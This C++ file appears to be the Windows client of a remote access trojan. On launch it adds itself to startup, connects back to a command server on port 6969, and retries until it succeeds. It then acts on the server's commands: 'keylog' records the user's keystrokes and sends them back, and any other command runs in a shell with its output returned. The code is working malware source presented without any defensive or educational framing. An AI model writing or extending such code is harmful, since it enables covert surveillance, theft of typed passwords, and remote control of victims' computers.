#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <windows.h>
#include <chrono>
#include <codecvt>
#include "modules.h"


#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 2048

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    AddToStartup();

    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    char sendbuf[DEFAULT_BUFLEN];
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        std::cout << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", "6969", &hints, &result);
    if (iResult != 0) {
        std::cout << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }

    // Attempt to connect to the first address returned by the call to getaddrinfo
    ptr = result;

    // Try to connect multiple times
    while (true) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            std::cout << "Error at socket(): " << WSAGetLastError() << std::endl;
            freeaddrinfo(result);
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;

            // If this was not the last attempt, wait for 5 seconds before trying again
            std::cout << "Connection failed, retrying in 5 seconds...\n";
            Sleep(5000); // Wait for 5 seconds before trying again
        } else {
            break;
        }
    }

    freeaddrinfo(result);

    // Receive and send data
    do {
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            std::cout << "Bytes received: " << iResult << std::endl;
            std::cout << "Message: " << recvbuf << std::endl;

            // Based on the command received, send information back
            // For example, if the server sends "hello", respond with "world"
            if (std::string(recvbuf, iResult) == "hello") {
                strcpy_s(sendbuf, "world");
                send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
            }
            else if (std::string(recvbuf, iResult) == "keylog") {
                std::wstring wstr = LogKeysForDuration();
                int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
                std::string strTo(sizeNeeded, 0);
                WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], sizeNeeded, NULL, NULL);

                strcpy_s(sendbuf, strTo.c_str());
                send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
            }
            else
            {
                std::string output = execCommand(std::string(recvbuf, iResult).c_str());
                strcpy_s(sendbuf, output.c_str());
                send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
            }
        }
        else if (iResult == 0)
            std::cout << "Connection closed" << std::endl;
        else
            std::cout << "recv failed: " << WSAGetLastError() << std::endl;

    } while (iResult > 0);

    // shutdown the connection since we're done
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        std::cout << "shutdown failed: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
